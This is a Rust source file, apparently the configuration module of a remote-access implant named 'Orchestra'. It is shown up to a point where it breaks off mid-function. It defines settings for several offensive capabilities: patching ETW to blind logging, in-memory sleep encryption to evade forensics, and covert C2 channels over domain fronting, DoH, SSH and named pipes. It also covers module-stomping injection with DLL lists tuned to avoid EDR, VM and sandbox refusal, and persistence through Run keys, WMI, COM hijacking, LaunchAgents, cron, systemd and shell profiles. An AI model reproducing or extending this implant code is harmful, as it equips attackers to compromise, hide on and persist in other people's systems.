use crate::normalized_transport::TrafficProfile;
use std::path::PathBuf;

/// ETW bypass strategy for Windows targets.
///
/// `Direct` (the default) overwrites the entry point of `EtwEventWrite`,
/// `EtwEventWriteEx`, and `NtTraceEvent` with a `ret` instruction.  No debug
/// registers are consumed and there is no exception-handler overhead.
///
/// `Hwbp` uses hardware breakpoints (Dr0–Dr3) via a vectored exception handler,
/// which is the approach implemented in `evasion::setup_hardware_breakpoints`.
/// Both methods may be active simultaneously: `Hwbp` remains the fallback when
/// `VirtualProtect` is blocked by CFG or other policy.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum EtwPatchMethod {
    #[default]
    Direct,
    Hwbp,
}

/// Controls when the direct-patch ETW bypass is applied relative to the
/// current Windows build number.
///
/// | Variant  | Behaviour |
/// |----------|---------- |
/// | `Safe`   | **Default.** Skip the patch on Windows 11 24H2 (build ≥ 26100) and later, where PatchGuard may detect ETW modifications and trigger a BSOD. |
/// | `Always` | Apply the patch regardless of build number. Useful in controlled test environments where PatchGuard is disabled. |
/// | `Never`  | Never apply the direct-patch bypass. Use when relying solely on the HWBP method or when ETW patching is undesirable. |
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum EtwPatchMode {
    /// Skip the patch on Windows builds ≥ 26100 (Win 11 24H2+).
    #[default]
    Safe,
    /// Always apply the patch, regardless of build number.
    Always,
    /// Never apply the direct-patch bypass.
    Never,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ExecStrategy {
    #[default]
    Indirect,
    Direct,
    Fallback,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SleepMethod {
    Ekko,
    Foliage,
    #[default]
    Standard,
}

/// Encryption scheme used for sleep-mask in-memory encryption.
///
/// Rotation between schemes defeats forensic signatures that target a
/// specific ciphertext structure (e.g. XChaCha20-Poly1305's 24-byte nonce
/// + 16-byte tag pattern).
#[derive(
    serde::Serialize, serde::Deserialize, Debug, Clone, Copy, PartialEq, Eq, Default,
)]
#[serde(rename_all = "kebab-case")]
pub enum SleepScheme {
    /// XChaCha20-Poly1305 AEAD (24-byte nonce, 16-byte tag). Default.
    #[default]
    XChaCha20Poly1305,
    /// AES-256-GCM AEAD (12-byte nonce, 16-byte tag).
    Aes256Gcm,
    /// ChaCha20 stream cipher (12-byte nonce, no authentication tag).
    /// Offers the highest throughput but provides **no integrity check** —
    /// tampered regions will silently decrypt to garbage rather than fail.
    ChaCha20,
}

impl SleepScheme {
    /// Parse a scheme name from its config/toml string representation.
    ///
    /// Accepts both kebab-case (`"xchacha20-poly1305"`) and the enum's
    /// `serde(rename_all = "kebab-case")` output.
    pub fn from_config_str(s: &str) -> Option<Self> {
        match s.to_ascii_lowercase().as_str() {
            "xchacha20-poly1305" | "xchacha20poly1305" => Some(Self::XChaCha20Poly1305),
            "aes-256-gcm" | "aes256gcm" => Some(Self::Aes256Gcm),
            "chacha20" => Some(Self::ChaCha20),
            _ => None,
        }
    }

    /// Nonce length in bytes required by this scheme.
    pub const fn nonce_len(&self) -> usize {
        match self {
            Self::XChaCha20Poly1305 => 24,
            Self::Aes256Gcm => 12,
            Self::ChaCha20 => 12,
        }
    }

    /// Authentication tag length in bytes.  `0` for unauthenticated schemes.
    pub const fn tag_len(&self) -> usize {
        match self {
            Self::XChaCha20Poly1305 => 16,
            Self::Aes256Gcm => 16,
            Self::ChaCha20 => 0,
        }
    }

    /// Whether this scheme provides AEAD authentication.
    pub const fn is_authenticated(&self) -> bool {
        self.tag_len() > 0
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SleepConfig {
    #[serde(default)]
    pub method: SleepMethod,
    #[serde(default = "default_base_interval")]
    pub base_interval_secs: u64,
    #[serde(default = "default_jitter_percent")]
    pub jitter_percent: u32,
    #[serde(default)]
    pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
    #[serde(default)]
    pub working_hours_end: Option<u32>, // e.g. 17 for 17:00
    #[serde(default)]
    pub off_hours_multiplier: Option<f32>,
    /// When `true`, the agent encrypts its `.text` and `.rdata` sections
    /// in-place with a per-sleep ChaCha20 key before sleeping and decrypts
    /// them on wake.  The 32-byte key is kept in a stack-local variable for
    /// the duration of the sleep, preventing memory-scanning tools from
    /// locating it via known global or thread-local offsets.  When `false`,
    /// the current timing-based obfuscated sleep behaviour is preserved.
    #[serde(default)]
    pub sleep_mask_enabled: bool,
    /// Interval in **seconds** between sleep-mask key rotations while the
    /// agent is idle.  Every N seconds the guarded regions are re-encrypted
    /// with a fresh XChaCha20-Poly1305 key so that a long-lived sleep window
    /// does not present a static ciphertext pattern to memory forensics.
    /// A value of `0` (the default) disables in-sleep rotation — the key
    /// generated at `lock()` time is kept for the entire sleep duration.
    /// Recommended production value: 300–600 seconds (5–10 minutes).
    #[serde(default)]
    pub mask_rotation_interval_secs: u64,
    /// Ordered list of encryption schemes to cycle through during sleep-mask
    /// key rotation.  Each rotation event advances to the next scheme in
    /// the list (wrapping around).  When empty or containing only a single
    /// entry, the behaviour is identical to the legacy single-scheme mode.
    ///
    /// Accepted values: `"xchaCha20-poly1305"`, `"aes-256-gcm"`, `"chacha20"`.
    ///
    /// # Backward compatibility
    ///
    /// If this field is omitted or empty, the agent uses
    /// `[XChaCha20Poly1305]` — identical to the pre-rotation behaviour.
    #[serde(default)]
    pub mask_rotation_schemes: Vec<String>,
}

impl SleepConfig {
    /// Resolve `mask_rotation_schemes` into a `Vec<SleepScheme>`.
    ///
    /// - If the list is empty, returns `[XChaCha20Poly1305]` (backward compat).
    /// - Unrecognised strings are logged and skipped.
    /// - If **no** entries parse successfully, falls back to
    ///   `[XChaCha20Poly1305]`.
    pub fn resolved_schemes(&self) -> Vec<SleepScheme> {
        if self.mask_rotation_schemes.is_empty() {
            return vec![SleepScheme::XChaCha20Poly1305];
        }
        let parsed: Vec<SleepScheme> = self
            .mask_rotation_schemes
            .iter()
            .filter_map(|s| {
                let scheme = SleepScheme::from_config_str(s);
                if scheme.is_none() {
                    log::warn!(
                        "sleep-mask: ignoring unrecognised scheme '{}' in \
                         mask_rotation_schemes",
                        s
                    );
                }
                scheme
            })
            .collect();
        if parsed.is_empty() {
            vec![SleepScheme::XChaCha20Poly1305]
        } else {
            parsed
        }
    }
}

fn default_base_interval() -> u64 {
    30
}
fn default_jitter_percent() -> u32 {
    20
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            method: SleepMethod::Standard,
            base_interval_secs: default_base_interval(),
            jitter_percent: default_jitter_percent(),
            working_hours_start: None,
            working_hours_end: None,
            off_hours_multiplier: None,
            sleep_mask_enabled: false,
            mask_rotation_interval_secs: 0,
            mask_rotation_schemes: Vec::new(),
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub struct MalleableProfile {
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_uri")]
    pub uri: String,
    #[serde(default = "default_host_header")]
    pub host_header: String,
    #[serde(default)]
    pub cdn_relay: bool,
    #[serde(default)]
    pub dns_over_https: bool,
    /// Direct C2 endpoint used when `cdn_relay` is false.
    /// Must be set to a real HTTPS URL (e.g., "https://c2.example.com") for
    /// non-CDN deployments.  Defaults to empty string; the agent will error
    /// at startup if this is empty and cdn_relay is false.
    #[serde(default)]
    pub direct_c2_endpoint: String,
    /// IP address returned by the C2 DNS server to signal that tasking is
    /// available.  Defaults to "1.2.3.4"; override per server so that
    /// multiple deployments can use different sentinels to avoid fingerprinting.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
    /// URL of the server-side DNS-to-C2 bridge that receives the DoH queries
    /// and routes them to the agent session.  **Required** when
    /// `dns_over_https = true`; the agent will refuse to activate the DoH
    /// transport if this field is absent or empty.  Example:
    /// `"https://c2.example.com/doh-bridge"`.
    #[serde(default)]
    pub doh_server_url: Option<String>,
    /// CDN relay endpoint for domain fronting.  The TCP connection goes here;
    /// the Host header carries the actual C2 domain.  Required when
    /// `cdn_relay = true`; the agent will bail at startup if this is empty
    /// and cdn_relay is enabled.  Example: `"cdn-provider.example.com"`.
    #[serde(default)]
    pub cdn_endpoint: String,
    /// Optional kill date in `YYYY-MM-DD` format (UTC).  When set, the agent
    /// will refuse to connect after this date.  Leave empty to disable.
    #[serde(default)]
    pub kill_date: String,
    /// Optional cloud instance identifier allowlist entry.  When set and the
    /// host IMDS instance-id matches this value, `refuse_in_vm` enforcement is
    /// bypassed for this trusted cloud VM.
    #[serde(default)]
    pub cloud_instance_id: Option<String>,
    /// Security override for IMDS body failures. When `true`, a host that
    /// passes IMDS reachability checks but does not return a parseable
    /// instance-id is still treated as trusted for VM-refusal bypass.
    ///
    /// Trade-off: this weakens identity binding from an exact instance-id to
    /// metadata reachability only. Keep `false` unless IMDS body access is
    /// unreliable in your environment.
    #[serde(default)]
    pub cloud_instance_allow_without_imds: bool,
    /// Fallback instance-id pattern list used only when IMDS instance-id
    /// retrieval fails. If at least one non-empty pattern is configured and
    /// the host matches an expected cloud hypervisor signature, VM-refusal can
    /// be bypassed as a break-glass fallback.
    ///
    /// Trade-off: this is less strict than exact `cloud_instance_id` matching
    /// and should be used sparingly; prefer exact ID pinning whenever possible.
    #[serde(default)]
    pub cloud_instance_fallback_ids: Vec<String>,
    /// Extra expected hypervisor name fragments for niche cloud providers.
    /// Each non-empty entry is matched case-insensitively against Linux DMI
    /// `product_name` in addition to the built-in cloud hypervisor list used
    /// by `is_expected_hypervisor`.
    ///
    /// Trade-off: broad values (for example, "virtual") can over-match and
    /// weaken VM-refusal enforcement. Keep entries provider-specific.
    #[serde(default)]
    pub vm_detection_extra_hypervisor_names: Vec<String>,
    /// When `true`, the VM-detection threshold is guaranteed to be at least 3
    /// regardless of cloud-detection results.  Useful on restricted networks
    /// where IMDS is firewalled and DMI strings are not in the built-in
    /// expected-hypervisor list, preventing false-positive VM refusals.
    ///
    /// Default: `false` (backward-compatible behaviour).
    #[serde(default)]
    pub vm_detection_high_threshold_mode: bool,
    /// SSH relay hostname for the `ssh-transport` feature.
    #[serde(default)]
    pub ssh_host: Option<String>,
    /// SSH relay port (default 22).
    #[serde(default)]
    pub ssh_port: Option<u16>,
    /// SSH username for authentication.
    #[serde(default)]
    pub ssh_username: Option<String>,
    /// SSH authentication configuration.
    #[serde(default)]
    pub ssh_auth: Option<SshAuthConfig>,
    /// Expected SHA-256 fingerprint of the SSH server host key (hex, optional).
    /// When set the agent rejects servers whose key does not match.  When
    /// absent the agent accepts any key but logs a warning.
    #[serde(default)]
    pub ssh_host_key_fingerprint: Option<String>,
    /// Controls when the direct-patch ETW bypass is applied.
    ///
    /// * `safe` (default) — skip the patch on Windows 11 24H2 (build ≥ 26100)
    ///   where PatchGuard may detect ETW modifications and BSOD.
    /// * `always` — always apply, regardless of build number (testing only).
    /// * `never`  — never apply this bypass.
    #[serde(default)]
    pub etw_patch_mode: EtwPatchMode,
    /// Enable the SMB/TCP named-pipe C2 transport.  When `true` the agent
    /// attempts to connect via a Windows named pipe before falling through
    /// to DoH / HTTP / direct TLS.  Windows-only; ignored on other platforms.
    #[serde(default)]
    pub smb_pipe_enabled: bool,
    /// Target host for the named-pipe transport (e.g. `"10.0.0.5"`).
    /// Required when `smb_pipe_enabled = true`.
    #[serde(default)]
    pub smb_pipe_host: Option<String>,
    /// Pipe name on the target host.  Defaults to `"orchestra"`.
    #[serde(default)]
    pub smb_pipe_name: Option<String>,
    /// Operating mode: `"smb"` connects directly to `\\host\pipe\name`
    /// over SMB; `"tcp_relay"` connects to a local TCP port that a relay
    /// on the pivot host forwards to the named pipe.
    #[serde(default)]
    pub smb_pipe_mode: Option<String>,
    /// TCP port for the local relay in `tcp_relay` mode.  Defaults to 4455.
    #[serde(default)]
    pub smb_tcp_relay_port: Option<u16>,
    /// DNS query prefix used by the DoH transport when constructing beacon
    /// and task queries.  Defaults to the compile-time random constant
    /// `IOC_DNS_BEACON` generated per build.  When overridden, the same
    /// value must be configured on the server's DoH listener.
    #[serde(default = "default_dns_prefix")]
    pub dns_prefix: String,
}

/// Authentication method for the SSH covert transport.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case", tag = "type")]
pub enum SshAuthConfig {
    /// Authenticate with an SSH private key loaded from disk at runtime.
    Key { key_path: String },
    /// Authenticate with a password (less secure; use key-based auth in
    /// production).
    Password { password: String },
    /// Delegate to the running ssh-agent process via the `SSH_AUTH_SOCK`
    /// environment variable.  Not available on Windows.
    Agent,
}

fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
}
fn default_uri() -> String {
    "/api/v1/update".to_string()
}
fn default_host_header() -> String {
    "cdn.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}
fn default_dns_prefix() -> String {
    crate::ioc::IOC_DNS_BEACON.to_string()
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            user_agent: default_user_agent(),
            uri: default_uri(),
            host_header: default_host_header(),
            cdn_relay: false,
            dns_over_https: false,
            direct_c2_endpoint: String::new(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
            doh_server_url: None,
            cdn_endpoint: String::new(),
            kill_date: String::new(),
            cloud_instance_id: None,
            cloud_instance_allow_without_imds: false,
            cloud_instance_fallback_ids: Vec::new(),
            vm_detection_extra_hypervisor_names: Vec::new(),
            vm_detection_high_threshold_mode: false,
            ssh_host: None,
            ssh_port: None,
            ssh_username: None,
            ssh_auth: None,
            ssh_host_key_fingerprint: None,
            etw_patch_mode: EtwPatchMode::default(),
            smb_pipe_enabled: false,
            smb_pipe_host: None,
            smb_pipe_name: None,
            smb_pipe_mode: None,
            smb_tcp_relay_port: None,
            dns_prefix: default_dns_prefix(),
        }
    }
}

/// Configuration for injection techniques (module stomping, etc.).
///
/// Controls which DLLs are considered as sacrificial hosts when the module-
/// stomping injector overwrites a `.text` section in a remote process.  The
/// candidate list and exclusion patterns are evaluated at runtime, allowing
/// operators to tailor behaviour per engagement without rebuilding the agent.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct InjectionConfig {
    /// Ordered list of DLL names (case-insensitive) that the module-stomp
    /// injector will attempt to load into the target process via
    /// `LdrLoadDll` when no already-loaded DLL is suitable.  Earlier entries
    /// are tried first.  Defaults to a curated set of low-visibility DLLs.
    ///
    /// Example: `["dwmapi.dll", "uxtheme.dll", "netprofm.dll"]`
    #[serde(default = "default_sacrificial_dlls")]
    pub sacrificial_dll_candidates: Vec<String>,

    /// Substring patterns (case-insensitive) for DLLs that must **never** be
    /// stomped, even if they have a suitably large `.text` section.  Use this
    /// to exclude DLLs known to be monitored by EDR/AV products.
    ///
    /// Defaults include well-known IoCs such as `amsi.dll`, `ws2_32.dll`,
    /// `kernel32.dll`, `ntdll.dll`, etc.  Operators can append additional
    /// patterns without overriding the built-in list.
    #[serde(default = "default_dll_exclusion_patterns")]
    pub dll_exclusion_patterns: Vec<String>,

    /// When `true` (the default), the module-stomp injector also appends
    /// the built-in exclusion patterns on top of any operator-supplied ones.
    /// Set to `false` to use *only* `dll_exclusion_patterns` as-is, which
    /// lets operators deliberately include a DLL that is excluded by default.
    #[serde(default = "default_true")]
    pub append_default_exclusions: bool,
}

impl Default for InjectionConfig {
    fn default() -> Self {
        Self {
            sacrificial_dll_candidates: default_sacrificial_dlls(),
            dll_exclusion_patterns: default_dll_exclusion_patterns(),
            append_default_exclusions: true,
        }
    }
}

fn default_sacrificial_dlls() -> Vec<String> {
    vec![
        "dwmapi.dll".into(),
        "uxtheme.dll".into(),
        "netprofm.dll".into(),
        "devobj.dll".into(),
        "cryptbase.dll".into(),
        "version.dll".into(),
        "wer.dll".into(),
        "msimg32.dll".into(),
        "d3d10.dll".into(),
        "propsys.dll".into(),
    ]
}

fn default_dll_exclusion_patterns() -> Vec<String> {
    Vec::new() // operator-supplied only; built-ins are added by the agent
}

/// Built-in exclusion patterns that are always applied unless
/// `append_default_exclusions` is `false`.  These are DLLs known to be
/// heavily monitored by EDR/AV products and must never be stomped.
pub const BUILTIN_DLL_EXCLUSIONS: &[&str] = &[
    "ntdll",
    "kernel32",
    "kernelbase",
    "crypt32",
    "dbghelp",
    "version",
    "secur32",
    "wintrust",
    "mscoree",
    "clrjit",
    "amsi",
    "ws2_32",
    "wininet",
    "winhttp",
    "urlmon",
    "ieframe",
    "msvcrt",
    "ucrtbase",
    "sspicli",
    "rpcrt4",
    "profapi",
    "bcrypt",
    "bcryptprimitives",
    "ncrypt",
    "schannel",
    "digest",
    "user32",
    "gdi32",
    "advapi32",
    "ole32",
    "oleaut32",
    "combase",
    "shell32",
    "shlwapi",
];

/// Check whether a lowercased DLL name matches any exclusion pattern.
///
/// Used by the module-stomp injector to decide if a loaded DLL should be
/// skipped as a sacrificial host.  This function is cross-platform so it
/// can be tested on Linux dev machines.
///
/// - `lname`: the DLL filename in **lowercase** (e.g. `"ntdll.dll"`).
/// - `operator_exclusions`: substring patterns from operator config.
/// - `builtin`: built-in prefix patterns (typically [`BUILTIN_DLL_EXCLUSIONS`]).
///
/// Returns `true` if the DLL should be excluded.
pub fn is_dll_excluded(lname: &str, operator_exclusions: &[String], builtin: &[&str]) -> bool {
    // Reject very short names (unlikely to be real DLLs, probably artifacts)
    if lname.len() < 5 {
        return true;
    }
    let lname_lower = lname.to_ascii_lowercase();
    // Check operator-supplied patterns (substring match, case-insensitive)
    for pat in operator_exclusions {
        if lname_lower.contains(&pat.to_ascii_lowercase()) {
            return true;
        }
    }
    // Check built-in exclusion list (prefix match, case-insensitive)
    for pat in builtin {
        if lname_lower.starts_with(&pat.to_ascii_lowercase()) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod injection_tests {
    use super::*;

    #[test]
    fn test_dll_excluded_builtin_patterns() {
        let builtin: &[&str] = &[
            "ntdll", "kernel32", "kernelbase", "amsi", "ws2_32", "wininet",
            "user32", "gdi32", "advapi32", "ole32", "shell32", "crypt32",
        ];
        let operator: Vec<String> = Vec::new();

        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("kernel32.dll", &operator, builtin));
        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
        assert!(is_dll_excluded("ws2_32.dll", &operator, builtin));

        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
        assert!(!is_dll_excluded("uxtheme.dll", &operator, builtin));
        assert!(!is_dll_excluded("netprofm.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_operator_patterns() {
        let builtin: &[&str] = &[];
        let operator: Vec<String> = vec!["suspicious".to_string(), "malware".to_string()];

        assert!(is_dll_excluded("suspicious_lib.dll", &operator, builtin));
        assert!(is_dll_excluded("some_malware_helper.dll", &operator, builtin));
        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_short_names() {
        let builtin: &[&str] = &[];
        let operator: Vec<String> = Vec::new();

        // Names shorter than 5 chars should be excluded (e.g., "x.dl" = 4 chars)
        assert!(is_dll_excluded("x.dl", &operator, builtin));
        assert!(is_dll_excluded("a", &operator, builtin));
        assert!(!is_dll_excluded("a.dll", &operator, builtin));
        assert!(!is_dll_excluded("abcde.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_case_insensitive() {
        let builtin: &[&str] = &["ntdll"];
        let operator: Vec<String> = vec!["MYCUSTOM".to_string()];

        assert!(is_dll_excluded("NTDLL.DLL", &operator, builtin));
        assert!(is_dll_excluded("Ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("mycustom_thing.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_combined_builtin_and_operator() {
        let builtin: &[&str] = &["ntdll", "amsi"];
        let operator: Vec<String> = vec!["custom".to_string()];

        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
        assert!(is_dll_excluded("custom_lib.dll", &operator, builtin));
        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
    }

    #[test]
    fn test_builtin_exclusions_constant() {
        // Verify the constant contains expected entries
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ntdll"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"amsi"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ws2_32"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"kernel32"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"user32"));
        // Should not contain harmless DLLs
        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"dwmapi"));
        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"uxtheme"));
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct Config {
    #[serde(default)]
    pub sleep: SleepConfig,
    #[serde(default)]
    pub malleable_profile: MalleableProfile,
    #[serde(default)]
    pub exec_strategy: ExecStrategy,
    #[serde(default = "default_allowed_paths")]
    pub allowed_paths: Vec<String>,
    #[serde(default = "default_heartbeat")]
    pub heartbeat_interval_secs: u64,
    #[serde(default)]
    pub persistence_enabled: bool,
    #[serde(default = "default_module_repo")]
    pub module_repo_url: String,
    /// Base64-encoded AES-256-GCM key used to decrypt signed capability modules.
    /// Distinct from `module_verify_key`; a module must pass *both* decryption
    /// (authenticated by GCM tag) and signature verification before it is loaded.
    #[serde(default, alias = "module_signing_key")]
    pub module_aes_key: Option<String>,
    /// Base64-encoded Ed25519 verifying (public) key used to check the 64-byte
    /// signature prepended to each module after decryption.  Required when the
    /// `module-signatures` feature is enabled.  If absent the compile-time
    /// constant `MODULE_SIGNING_PUBKEY` is used instead.
    #[serde(default)]
    pub module_verify_key: Option<String>,
    /// Directory from which `DeployModule` loads pre-staged module blobs.
    /// Defaults to `~/.cache/orchestra/modules` on Unix and
    /// `%LOCALAPPDATA%\Orchestra\modules` on Windows.
    #[serde(default = "default_module_cache_dir")]
    pub module_cache_dir: String,
    /// Wire-level traffic shaping profile. See [`TrafficProfile`] and
    /// [`crate::normalized_transport`] for details.
    #[serde(default)]
    pub traffic_profile: TrafficProfile,
    /// If set, the agent will refuse to start unless the host machine is
    /// joined to this DNS domain (case-insensitive).
    #[serde(default)]
    pub required_domain: Option<String>,
    /// When `true`, the agent refuses to start when virtualization or
    /// sandbox artifacts are detected. Defaults to `false` because most
    /// legitimate enterprise endpoints today are virtualized.
    #[serde(default)]
    pub refuse_in_vm: bool,
    /// When `true`, the agent refuses to start if a debugger is attached to
    /// the agent process itself. Defaults to `false`; debugger detection is
    /// otherwise reported as telemetry only.
    #[serde(default)]
    pub refuse_when_debugged: bool,
    /// Optional sandbox-score threshold. When set, startup is refused only if
    /// the combined sandbox score is greater than or equal to this value.
    /// Leave unset to keep sandbox scoring informational.
    #[serde(default)]
    pub sandbox_score_threshold: Option<u32>,
    /// SHA-256 fingerprint (64 lowercase hex chars) of the Orchestra Control
    /// Center's TLS certificate. When set, `outbound-c` mode pins the server
    /// certificate instead of accepting any certificate.
    ///
    /// Generate with:
    ///   openssl x509 -in server.crt -outform DER | sha256sum
    #[serde(default)]
    pub server_cert_fingerprint: Option<String>,
    /// Maximum number of concurrent connections for port scanning.
    #[serde(default = "default_port_scan_concurrency")]
    pub port_scan_concurrency: usize,
    /// Timeout in milliseconds for each port connection during scans.
    #[serde(default = "default_port_scan_timeout")]
    pub port_scan_timeout_ms: u64,
    /// Fine-grained control over which persistence mechanisms are enabled.
    /// Defaults to all mechanisms on; operators can selectively disable
    /// individual mechanisms without rebuilding the agent.
    #[serde(default)]
    pub persistence: PersistenceConfig,
    /// ETW bypass method. Defaults to [`EtwPatchMethod::Direct`] (overwrite
    /// function entry with `ret`) when absent. Set to `hwbp` to use the
    /// hardware-breakpoint VEH approach instead.
    #[serde(default)]
    pub etw_patch_method: Option<EtwPatchMethod>,
    /// Interval in seconds between periodic self-re-encoding passes.  Only
    /// effective when the agent is compiled with the `self-reencode` feature.
    /// Default: 14 400 s (4 hours).
    #[serde(default = "default_reencode_interval")]
    pub reencode_interval_secs: u64,
    /// Fine-grained control over injection behaviour (module stomping DLL
    /// candidates, exclusion patterns, etc.).
    #[serde(default)]
    pub injection: InjectionConfig,
}

/// Per-platform list of persistence mechanisms to install.
///
/// Sensible defaults enable multiple mechanisms so that removal of one does
/// not drop persistence entirely.  Operators can disable individual mechanisms
/// (e.g., `wmi_subscription = false` on locked-down endpoints where WMI
/// commands are monitored) without rebuilding the agent.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct PersistenceConfig {
    // ── Windows ───────────────────────────────────────────────────────────────
    /// HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry (Windows).
    #[serde(default = "default_true")]
    pub registry_run_key: bool,
    /// Copy to the user Startup folder (Windows).
    #[serde(default = "default_true")]
    pub startup_folder: bool,
    /// WMI __EventFilter + CommandLineEventConsumer subscription (Windows).
    /// Requires PowerShell and WMI access; disable on heavily-locked endpoints.
    #[serde(default = "default_true")]
    pub wmi_subscription: bool,
    /// COM server CLSID hijack via HKCU\Software\Classes\CLSID (Windows).
    /// Only effective when the agent is an in-process DLL.  Disabled by
    /// default to avoid registry noise on endpoints that do not support it.
    #[serde(default)]
    pub com_hijacking: bool,

    // ── macOS ─────────────────────────────────────────────────────────────────
    /// ~/Library/LaunchAgents plist loaded at user login (macOS).
    #[serde(default = "default_true")]
    pub launch_agent: bool,
    /// /Library/LaunchDaemons plist loaded at boot (macOS, requires root).
    #[serde(default = "default_true")]
    pub launch_daemon: bool,
    /// Login item added via osascript / System Events (macOS, user session).
    #[serde(default = "default_true")]
    pub login_item: bool,
    /// @reboot crontab entry as a fallback (macOS / Linux).
    #[serde(default = "default_true")]
    pub cron_job: bool,

    // ── Linux ─────────────────────────────────────────────────────────────────
    /// ~/.config/systemd/user service enabled at login (Linux).
    #[serde(default = "default_true")]
    pub systemd_service: bool,
    /// Append a backgrounded exec block to ~/.bashrc / ~/.profile (Linux).
    /// Disable if the shell profiles are monitored by an EDR.
    #[serde(default = "default_true")]
    pub shell_profile: bool,

    // ── IoC Override Fields ───────────────────────────────────────────────────
    /// Override the registry Run key value name (Windows).  When unset, a
    /// random 8–12 character alphanumeric string is generated at runtime.
    #[serde(default)]
    pub registry_value_name: Option<String>,
    /// Override the WMI event subscription name (Windows).  When unset, a
    /// random 8–12 character alphanumeric string is generated at runtime.
    #[serde(default)]
    pub wmi_subscription_name: Option<String>,
    /// Override the COM hijack CLSID (Windows).  When unset, a random valid
    /// CLSID is generated at runtime.
    #[serde(default)]
    pub com_hijack_clsid: Option<String>,
    /// Override the startup folder filename (Windows).  When unset, a random
    /// legitimate-sounding filename is generated at runtime.
    #[serde(default)]
    pub startup_filename: Option<String>,
}

fn default_true() -> bool {
    true
}

impl Default for PersistenceConfig {
    fn default() -> Self {
        Self {
            registry_run_key: true,
            startup_folder: true,
            wmi_subscription: true,
            com_hijacking: false,
            launch_agent: true,
            launch_daemon: true,
            login_item: true,
            cron_job: true,
            systemd_service: true,
            shell_profile: true,
            registry_value_name: None,
            wmi_subscription_name: None,
            com_hijack_clsid: None,
            startup_filename: None,
        }
    }
}

fn default_allowed_paths() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        vec![
            "C:\\Users".into(),
            "C:\\Windows\\Temp".into(),
            "C:\\ProgramData".into(),
        ]
    }
    #[cfg(target_os = "macos")]
    {
        vec!["/Users".into(), "/var/log".into(), "/tmp".into()]
    }
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    {
        vec!["/var/log".into(), "/home".into(), "/tmp".into()]
    }
}

fn default_heartbeat() -> u64 {
    30
}

fn default_port_scan_concurrency() -> usize {
    50
}

fn default_port_scan_timeout() -> u64 {
    200
}

fn default_module_repo() -> String {
    "https://updates.example.com/modules".into()
}

fn default_reencode_interval() -> u64 {
    14_400 // 4 hours
}

pub fn default_module_cache_dir() -> String {
    if cfg!(windows) {
        let base = std::env::var_os("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("C:\\ProgramData"));
        base.join("Orchestra")
            .join("modules")
            .to_string_lossy()
            .into_owned()
    } else {
        // Prefer $XDG_CACHE_HOME; fall back to $HOME/.cache.
        // Never fall back to /tmp which is world-writable (M-38 fix).
        let cache_base = std::env::var_os("XDG_CACHE_HOME")
            .map(PathBuf::from)
            .or_else(|| {
                std::env::var_os("HOME")
                    .map(|h| PathBuf::from(h).join(".cache"))
            });
        cache_base
            .map(|p| p.join("orchestra").join("modules"))
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned()
    }
}

impl Default for Config {
    fn default() -> Self {
        let module_cache_dir = default_module_cache_dir();
        let mut allowed_paths = default_allowed_paths();

        // Ensure the module cache directory is always in allowed_paths.
        // Without this, deployments running as root (where HOME=/root) would
        // have a module_cache_dir under /root/.cache which is not covered by
        // the Linux default allowed_paths of ["/var/log", "/home", "/tmp"].
        let cache_parent = PathBuf::from(&module_cache_dir)
            .parent()
            .and_then(|p| p.parent()) // strip .../modules -> .../orchestra -> .../cache
            .map(|p| p.to_string_lossy().into_owned());
        if let Some(parent) = cache_parent {
            if !allowed_paths.iter().any(|a| parent.starts_with(a.as_str())) {
